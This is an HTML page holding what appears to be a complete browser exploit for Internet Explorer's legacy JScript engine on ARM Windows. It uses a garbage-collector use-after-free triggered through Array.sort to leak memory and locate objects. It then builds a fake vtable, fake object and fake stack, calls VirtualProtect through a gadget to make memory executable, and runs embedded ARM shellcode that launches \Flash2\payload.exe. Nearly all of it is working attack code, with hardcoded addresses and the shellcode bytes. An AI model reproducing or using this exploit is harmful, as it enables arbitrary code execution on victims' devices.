<meta http-equiv="X-UA-Compatible" content="IE=8"></meta>


<script>

    /* Shellcode TLDR:
        CreateProcessW("\\Flash2\\payload.exe", null, null, null, ..);
        ExitThread(0);
     */
    /*
.align 4
adr r0, path
eor r1, r1
eor r2, r2
eor r3, r3

eor r4, r4

sub sp, sp, #0x14
str r4, [sp,  #0x0]
str r4, [sp,  #0x4]
str r4, [sp,  #0x8]
str r4, [sp,  #0xc]
str r4, [sp,  #0x10]

sub r4, sp, #0x14
str r4, [sp, #0x14]
ldr r5, =0x40331c14
mov lr, pc
bx r5

a:
b a



path:
.byte 0x5c
.byte 00
.byte 0x46
.byte 00
.byte 0x6c
.byte 00
.byte 0x61
.byte 00
.byte 0x73
.byte 00
.byte 0x68
.byte 00
.byte 0x32
.byte 00
.byte 0x5c
.byte 00
.byte 0x70
.byte 00
.byte 0x61
.byte 00
.byte 0x79
.byte 00
.byte 0x6c
.byte 00
.byte 0x6f
.byte 00
.byte 0x61
.byte 00
.byte 0x64
.byte 00
.byte 0x2e
.byte 00
.byte 0x65
.byte 00
.byte 0x78
.byte 00
.byte 0x65
.byte 00
.byte 00
.byte 00
     */

// Location for fake string, has a large number before it
var gbl_leak_offset    = 0x00011b80;

var flag = false;

function go() {
    var box2 = document.getElementById("box2");
    try {
        go2(box2);
    } catch (e) {
        box2.innerHTML += "ERROR</br>";
        box2.innerHTML += "" + e.message;
    }
}

function go2(box2) {
  box2.innerHTML += "Create big strings</br>";


  box2.innerHTML += "Leak</br>";
    for(var i=0; i<15; i++) {
        CollectGarbage();
        
        try {
        setup_leak();
        } catch(e) {
          box2.innerHTML += "Leak err:" + e + "</br>";
        }
        if(flag) {
          box2.innerHTML += "Leak work</br>";
        break;
        }
        CollectGarbage();
    }

    if(!flag){
  box2.innerHTML += "No find</br>";
  return;
  }

// find addr of our shellcode
  box2.innerHTML += "go find</br>";

   
   function read_var(ptr) {
       var ty = dwordFromStr(leak_str, ((ptr + 0x0 - gbl_leak_offset) >> 1)) & 0xFF;
       var val_hi = dwordFromStr(leak_str, ((ptr + 0x4 - gbl_leak_offset) >> 1));
       var val_lo = dwordFromStr(leak_str, ((ptr + 0x8 - gbl_leak_offset) >> 1));
       var _unused = dwordFromStr(leak_str, ((ptr + 0xc - gbl_leak_offset) >> 1));

       return {
           ty: ty,
           val_hi: val_hi,
           val_lo: val_lo,
           _unused: _unused
       };
   }
   
   function read_iscavengerbase(ptr) {
       var scav_vtbl = dwordFromStr(leak_str, ((ptr + 0x0 - gbl_leak_offset) >> 1));
       var scav_next_ptr = dwordFromStr(leak_str, ((ptr + 0xc - gbl_leak_offset) >> 1));
       var scav_prev = dwordFromStr(leak_str, ((ptr + 0x8 - gbl_leak_offset) >> 1));

       var scav_next = dwordFromStr(leak_str, ((scav_next_ptr - gbl_leak_offset) >> 1));

       var type = "Unk";
       var obj = {};

       if (scav_vtbl === 0x40e946d0) {
           type = "nameTbl";
       } else if (scav_vtbl === 0x40e92344) {
           type = "ScavVarList";
           var scav_buf = dwordFromStr(leak_str, ((ptr + 0x10 - gbl_leak_offset) >> 1));
           var scav_count = dwordFromStr(leak_str, ((ptr + 0x14 - gbl_leak_offset) >> 1));


           obj.buf = scav_buf;
           obj.count = scav_count;

           obj.elems = [];
           for (var i = 0; i < scav_count; i++) {
               obj.elems.push(read_var(scav_buf + 0x8 + 0x20 * i));
           }
       } else if (scav_vtbl === 0x40e9231c) {
           type = "VarStack";
       }

       return {
           vtbl: scav_vtbl,
           type: type,
           next: scav_next,
           prev: scav_prev,
           obj: obj
       };
   }
   
   function print_iscavengerbase(box2, scav) {
       box2.innerHTML += "-------</br>";
       box2.innerHTML += "scav_vtbl=0x" + scav.vtbl.toString(16) + " ";
       box2.innerHTML += "scav_next=0x" + scav.next.toString(16) + " ";
       box2.innerHTML += "scav_prev=0x" + scav.prev.toString(16) + " ";
       box2.innerHTML += "scav_type=" + scav.type + " ";
       if (scav.type === "ScavVarList") {
           box2.innerHTML += " obj.count=0x" + scav.obj.count.toString(16) + " </br>";
           box2.innerHTML += " obj.buf=0x" + scav.obj.buf.toString(16) + " </br>";
           for (var i = 0; i < scav.obj.elems.length; i++) {
               box2.innerHTML += " obj.elems[" + i + "].ty=0x" + scav.obj.elems[i].ty.toString(16) + " </br>";
               box2.innerHTML += " obj.elems[" + i + "].val_hi=0x" + scav.obj.elems[i].val_hi.toString(16) + " </br>";
               box2.innerHTML += " obj.elems[" + i + "].val_lo=0x" + scav.obj.elems[i].val_lo.toString(16) + " </br>";
           }
       }
       box2.innerHTML += "-------</br>";
   }


   function addr_of(target_str) {
       var leak_val = "";


       function ff(first, second) {
           if (!(first === 0x1337 && second === 0x1337)) {
               return 0;
           }
           var box2 = document.getElementById("box2");
          // box2.innerHTML += ("hit" + first.toString(16) + " " + second.toString(16));


           document.tls = dwordFromStr(leak_str, ((0x40f3bfd4 - gbl_leak_offset) >> 1));
        //   box2.innerHTML += "tls=0x" + document.tls.toString(16) + " ";

           document.gc = dwordFromStr(leak_str, ((document.tls + 0x14 - gbl_leak_offset) >> 1));
         //  box2.innerHTML += "gc=0x" + document.gc.toString(16) + " ";

           document.gc_scavengers = dwordFromStr(leak_str, ((document.gc + 0x18 - gbl_leak_offset) >> 1));
         //  box2.innerHTML += "gc_scavengers=0x" + document.gc_scavengers.toString(16) + " ";

           var scav = read_iscavengerbase(document.gc_scavengers);
           while (true) {
              // print_iscavengerbase(box2, scav);

               if (scav.type === "ScavVarList") {
                   if (scav.obj.count === 4) {
                       if (scav.obj.elems[0].ty === 0x80) {
                           var vvar_var = read_var(scav.obj.elems[0].val_lo);
                           // box2.innerHTML += " obj.elems[].ty=0x" + vvar_var.ty.toString(16) + " </br>";
                           // box2.innerHTML += " obj.elems[].val_hi=0x" + vvar_var.val_hi.toString(16) + " </br>";
                           // box2.innerHTML += " obj.elems[].val_lo=0x" + vvar_var.val_lo.toString(16) + " </br>";

                           if (vvar_var.ty === 0x8) {
                               leak_val = vvar_var.val_lo;
                               // var tmp = dwordFromStr(leak_str, ((vvar_var.val_lo - gbl_leak_offset) >> 1));
                               // box2.innerHTML += "tmp=0x" + tmp.toString(16) + " ";
                               // tmp = dwordFromStr(leak_str, ((vvar_var.val_lo + 0x4 - gbl_leak_offset) >> 1));
                               // box2.innerHTML += "tmp=0x" + tmp.toString(16) + " ";
                               // tmp = dwordFromStr(leak_str, ((vvar_var.val_lo + 0x8 - gbl_leak_offset) >> 1));
                               // box2.innerHTML += "tmp=0x" + tmp.toString(16) + " ";
                               // tmp = dwordFromStr(leak_str, ((vvar_var.val_lo + 0xc - gbl_leak_offset) >> 1));
                               // box2.innerHTML += "tmp=0x" + tmp.toString(16) + " ";

                               break;

                           }

                       }
                   }
               }


               if (scav.prev === 0) {
                   break;
               }

               scav = read_iscavengerbase(scav.prev);
           }


           return 0;
       }

       [target_str, 0x81828384, 0x1337, 0x1337].sort(ff);

       return leak_val;
   }

  
  
  
  
  
  // var teststr1 = g_teststr.substr(0, g_teststr.length);
  // var teststr_addr = addr_of(teststr1);
  // box2.innerHTML += ("</br> [*] teststr_addr = " + teststr_addr.toString(16) + "</br>");

    var fake_stack = "";
    fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
    fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
    fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
    fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
    fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
    fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
    fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
    fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
    fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
    fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
    fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
    fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
    fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
    fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
    fake_stack = fake_stack.substr(0, fake_stack.length);
    var fake_stack_addr = addr_of(fake_stack);
    box2.innerHTML += ("</br> [*] fake_stack_addr = " + fake_stack_addr.toString(16));


    var shellcode = "";


   var shell=[
       0x4c, 0x00, 0x8f, 0xe2, 0x01, 0x10, 0x21, 0xe0,
       0x02, 0x20, 0x22, 0xe0, 0x03, 0x30, 0x23, 0xe0,
       0x04, 0x40, 0x24, 0xe0, 0x14, 0xd0, 0x4d, 0xe2,
       0x00, 0x40, 0x8d, 0xe5, 0x04, 0x40, 0x8d, 0xe5,
       0x08, 0x40, 0x8d, 0xe5, 0x0c, 0x40, 0x8d, 0xe5,
       0x10, 0x40, 0x8d, 0xe5, 0x14, 0x40, 0x4d, 0xe2,
       0x14, 0x40, 0x8d, 0xe5, 0x40, 0x50, 0x9f, 0xe5,
       0x0f, 0xe0, 0xa0, 0xe1, 0x15, 0xff, 0x2f, 0xe1,
       0x00, 0x00, 0x20, 0xe0, 0x34, 0x50, 0x9f, 0xe5,
       0x0f, 0xe0, 0xa0, 0xe1, 0x15, 0xff, 0x2f, 0xe1,
       0xfe, 0xff, 0xff, 0xea, 0x5c, 0x00, 0x46, 0x00,
       0x6c, 0x00, 0x61, 0x00, 0x73, 0x00, 0x68, 0x00,
       0x32, 0x00, 0x5c, 0x00, 0x70, 0x00, 0x61, 0x00,
       0x79, 0x00, 0x6c, 0x00, 0x6f, 0x00, 0x61, 0x00,
       0x64, 0x00, 0x2e, 0x00, 0x65, 0x00, 0x78, 0x00,
       0x65, 0x00, 0x00, 0x00, 0x14, 0x1c, 0x33, 0x40,
       0xa4, 0x40, 0x34, 0x40,
   ];
   for(var i = 0; i < shell.length; i+=2) {
       shellcode += String.fromCharCode((shell[i+1] << 8)|(shell[i]));
   }
   var shellcode_sz = shellcode.length;

    shellcode = shellcode.substr(0, shellcode.length);
    var shellcode_addr = addr_of(shellcode);
    box2.innerHTML += ("</br> [*] shellcode_addr = " + shellcode_addr.toString(16));
// for(var i = 0; i < 32; i+=2) {
//         var x = dwordFromStr(leak_str, ((shellcode_addr - gbl_leak_offset) >> 1) + i);
//         box2.innerHTML += x.toString(16) + " ";
//     }


    var tgt_func = 0x4035a514; // all regs

    var fake_vtable = "";
    for(var i = 0; i < 20; i++) {
        fake_vtable += "AA";
    }
    for(var i = 0; i < 19; i++) {
        fake_vtable += "BB";
    }
    fake_vtable += String.fromCharCode((tgt_func) & 0xFFFF); // +0x9c
    fake_vtable += String.fromCharCode(((tgt_func) & 0xFFFF0000)>>16);

    fake_vtable = fake_vtable.substr(0, fake_vtable.length);
    var fake_vtable_addr = addr_of(fake_vtable);
    box2.innerHTML += ("</br> [*] fake_vtable_addr = " + fake_vtable_addr.toString(16));
    // for(var i = 0; i < 32; i+=2) {
    //     var x = dwordFromStr(leak_str, ((fake_vtable_addr - gbl_leak_offset) >> 1) + i);
    //     box2.innerHTML += x.toString(16) + " ";
    // }


    /* TL;DR: call ldmia {every reg} gadget, setting r0-r3 + pc to VirtualProtect(str, RWX, 1, <out>), and return from that to string*/

    var fake_object = "";
    // our fake vtable
    fake_object += String.fromCharCode((fake_vtable_addr) & 0xFFFF);
    fake_object += String.fromCharCode(((fake_vtable_addr) & 0xFFFF0000)>>16);

  // args for pivot
  // VirtualProtect arg0 - arg4
  fake_object += String.fromCharCode((shellcode_addr) & 0xFFFF); // addr
  fake_object += String.fromCharCode(((shellcode_addr) & 0xFFFF0000)>>16);
  fake_object += String.fromCharCode(shellcode_sz & 0xFFFF); // sz
  fake_object += String.fromCharCode((shellcode_sz & 0xFFFF0000)>>16);
  fake_object += String.fromCharCode(0x40 & 0xFFFF); // prot
  fake_object += String.fromCharCode((0x40 & 0xFFFF0000)>>16);
  // output to some random RW mem
  fake_object += String.fromCharCode((0x40f37010) & 0xFFFF); // out
  fake_object += String.fromCharCode(((0x40f37010) & 0xFFFF0000)>>16);

  // padding for pivot
  fake_object += String.fromCharCode(0,0, 0,0, 0,0, 0,0, 0,0, 0,0, 0,0, 0,0, 0,0);
  // sp
  // fake_object += String.fromCharCode((0x40f37140) & 0xFFFF);
  // fake_object += String.fromCharCode(((0x40f37140) & 0xFFFF0000)>>16);
  fake_object += String.fromCharCode((fake_stack_addr+128) & 0xFFFF);
  fake_object += String.fromCharCode(((fake_stack_addr+128) & 0xFFFF0000)>>16);
  // lr
  fake_object += String.fromCharCode((shellcode_addr) & 0xFFFF);
  fake_object += String.fromCharCode(((shellcode_addr) & 0xFFFF0000)>>16);
  // pc (virtual protect)
  fake_object += String.fromCharCode((0x40332b88) & 0xFFFF);
  fake_object += String.fromCharCode(((0x40332b88) & 0xFFFF0000)>>16);

  fake_object = fake_object.substr(0, fake_object.length);
  var fake_obj_address = addr_of(fake_object);
  box2.innerHTML += ("</br> [*] fake_obj_address = " + fake_obj_address.toString(16) + "</br>");
    // for(var i = 0; i < 32; i+=2) {
    //     var x = dwordFromStr(leak_str, ((fake_obj_address - gbl_leak_offset) >> 1) + i);
    //     box2.innerHTML += x.toString(16) + " ";
    // }

  var fake_var = "";
    fake_var += "\u0000\u0000"; // idk
    fake_var += "\u0081"; // ty
  fake_var += "\u0000"; // pad
  fake_var += "\u0000\u0000"; // hi
  fake_var += String.fromCharCode(fake_obj_address & 0xFFFF); //lo
  fake_var += String.fromCharCode((fake_obj_address & 0xFFFF0000)>>16);
  fake_var = fake_var.substr(0, fake_var.length);
    var fake_var_address = addr_of(fake_var);

    // for(var i = 0; i < 32; i+=2) {
    //     var x = dwordFromStr(leak_str, ((fake_var_address - gbl_leak_offset) >> 1) + i);
    //     box2.innerHTML += x.toString(16) + " ";
    // }

    function test_dump(box2, ptr) {
        var v = read_var(ptr+4);
        box2.innerHTML += ("</br> [*] ty = " + v.ty.toString(16) + "</br>");
        box2.innerHTML += ("</br> [*] obj_ptr = " + v.val_lo.toString(16) + "</br>");

        var obj_vtbl = dwordFromStr(leak_str, ((v.val_lo + 0x0 - gbl_leak_offset) >> 1));
        var obj_0xc = dwordFromStr(leak_str, ((v.val_lo + 0xc - gbl_leak_offset) >> 1));

        box2.innerHTML += ("</br> [*] obj_vtbl = " + obj_vtbl.toString(16) + "</br>");
        box2.innerHTML += ("</br> [*] obj_0xc = " + obj_0xc.toString(16) + "</br>");

        var obj_vtbl_typeof = dwordFromStr(leak_str, ((obj_vtbl+0x9c - gbl_leak_offset) >> 1));
        box2.innerHTML += ("</br> [*] obj_vtbl+0x9c = " + obj_vtbl_typeof.toString(16) + "</br>");
    }
    test_dump(box2, fake_var_address);

// return;
  //var tgt_str2_addr = addr_of(fake_var);
  //box2.innerHTML += ("</br> [*] tgt_str2_addr = " + tgt_str2_addr.toString(16) + "</br>");

  test1_1 = new Array(700>>3).join(fake_var);

  box2.innerHTML += ("</br></br></br>EXE!</br>");

  for(var i = 0; i<100; i++) {
      CollectGarbage();
  }

flag = false;
    for(var i=0; i<40; i++) {
        box2.innerHTML += "A: " + i + "</br>";
        CollectGarbage();

        try {
          exe(box2);
        } catch(e) {
          box2.innerHTML += "exe err:" + e.message + "</br>";
        }
        if(flag) {
          box2.innerHTML += "exe work</br>";
        break;
        }
        box2.innerHTML += "NW</br>";
        CollectGarbage();
    }

    if(!flag){
  box2.innerHTML += "No exe</br>";
  return;
  }

   // test_dump(box2, fake_var_address);

  return 0;
}

var spray2_1 = new Array();
var spray_1 = new Array();
var test1_1 = null;
function exe(box2) {
    var cnt = 6000;
    var cnt2 = 500;

    function F() {

        CollectGarbage();

        for (var i = 0; i < cnt2; i++) spray2_1[i] = new Object();

        // 2. Create a bunch of objects
        for (var i = 0; i < cnt; i++) {
            spray_1[i] = new Object();
        }

        // 3. Store a reference to one of them in the arguments array
        //    The arguments array isn't tracked by garbage collector
        arguments[0] = spray_1[300];

        // 4. Delete the objects and call the garbage collector
        //    All JSCript variables get reclaimed...
        for (var i = 0; i < cnt; i++) spray_1[i] = 1;
        CollectGarbage();

        for (var i = 0; i < cnt2; i++) {
            spray2_1[i][test1_1] = 1;
        }

        var x = arguments[0];

        var y = typeof x;
        if (y != "undefined") {
            alert(y);
            flag = true;
        }

        return 0;
    }

    // 1. Call sort with a custom callback
    [1, 2].sort(F);
}

function dwordFromStr(str, index) {
    var cc1 = String.prototype.charCodeAt.call(str, index);
    var cc2 = String.prototype.charCodeAt.call(str, index + 1);
    return cc1 + cc2 * 65536;
}
 
 var leak_str = "";


var spray2 = new Array();
var spray = new Array();
var test1 = new Array(700>>3).join("\u0000\u0000\u0008\u0000\u0000\u0000\u1b80\u0001");
// var test1 = new Array(700>>3).join("\u0000\u0000\u0008\u0000\u0000\u0000\u1010\u40e9");

function setup_leak() {


    var cnt = 6000;
    var cnt2 = 500;


    function F() {

        // CollectGarbage();

        for (var i = 0; i < cnt2; i++) spray2[i] = new Object();

        // 2. Create a bunch of objects
        for (var i = 0; i < cnt; i++) {
            spray[i] = new Object();
        }

        // 3. Store a reference to one of them in the arguments array
        //    The arguments array isn't tracked by garbage collector
        arguments[0] = spray[300];

        // 4. Delete the objects and call the garbage collector
        //    All JSCript variables get reclaimed... 
        for (var i = 0; i < cnt; i++) spray[i] = 1;
        CollectGarbage();

        for (var i = 0; i < cnt2; i++) {
            spray2[i][test1] = 1;
        }

        var x = arguments[0];

        var y = typeof x;
        if (y === "string") {
            flag = true;
            leak_str = x;
        }

        return 0;
    }

    // 1. Call sort with a custom callback
    [1, 2].sort(F);

}

</script>

<div id="box2" style="width: 240px; height: 300px; background-color: black; color: green;"></div>

<button style="width: 100px; height: 100px;" onclick="go()">Test</button>
